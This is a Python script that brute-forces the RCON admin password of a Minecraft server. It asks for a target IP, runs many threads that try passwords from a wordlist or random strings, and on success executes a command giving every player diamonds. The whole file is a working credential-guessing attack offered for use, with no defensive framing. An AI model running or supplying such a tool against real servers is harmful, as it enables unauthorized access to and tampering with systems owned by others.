from mcrcon import MCRcon
import threading
from queue import Queue
import random
import string

class RCONPasswordTrier:
    def __init__(self, host, port, passwords, command, max_threads):
        self.host = host
        self.port = port
        self.command = command
        self.max_threads = max_threads
        self.password_queue = Queue()
        self.lock = threading.Lock()
        self.total_attempts = 0

        for password in passwords:
            self.password_queue.put(password)

    @classmethod
    def from_file(cls, host, port, password_file, command, max_threads):
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
        return cls(host, port, passwords, command, max_threads)

    @classmethod
    def from_length_range(cls, host, port, command, max_threads, max_length, charset=None, min_length=1):
        charset = charset or string.ascii_letters + string.digits + "!@#$%^&*"
        passwords = []
        
        # Generate one password for each length up to max_length
        for length in range(min_length, max_length + 1):
            passwords.append(''.join(random.choices(charset, k=length)))
        
        # Generate additional random passwords across all lengths
        for _ in range(max_length * 10):  # 10 tries per length
            length = random.randint(min_length, max_length)
            passwords.append(''.join(random.choices(charset, k=length)))
            
        return cls(host, port, passwords, command, max_threads)

    def try_password(self):
        while not self.password_queue.empty():
            password = self.password_queue.get()
            with self.lock:
                self.total_attempts += 1
                attempt_number = self.total_attempts

            try:
                with MCRcon(self.host, password, self.port) as mcr:
                    response = mcr.command(self.command)
                    with self.lock:
                        print(f"Password {attempt_number} (len {len(password)}): '{password}' is correct. Response: {response}")
                    return
            except Exception as e:
                with self.lock:
                    print(f"Password {attempt_number} (len {len(password)}): '{password}' failed: {str(e)[:50]}")

    def start(self):
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.try_password)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    host = input("Enter target IP: ")
    port = int(input("Input RCON port (default is 25575): ") or 25575)
    command = "/give @a minecraft:diamond 64"
    max_threads = int(input("Input max threads: "))
    
    choice = input("Choose method:\n1. Password list\n2. Length-based brute force\n> ")
    
    if choice == "1":
        password_file = input("Input path to password list: ")
        trier = RCONPasswordTrier.from_file(host, port, password_file, command, max_threads)
    elif choice == "2":
        max_length = int(input("Maximum password length to try: "))
        charset_choice = input("Use default charset (y/n)? ").lower()
        
        if charset_choice == 'n':
            custom_charset = input("Enter custom characters: ")
            trier = RCONPasswordTrier.from_length_range(
                host, port, command, max_threads,
                max_length, custom_charset
            )
        else:
            trier = RCONPasswordTrier.from_length_range(
                host, port, command, max_threads,
                max_length
            )
    else:
        print("Invalid choice")
        exit()

    trier.start()
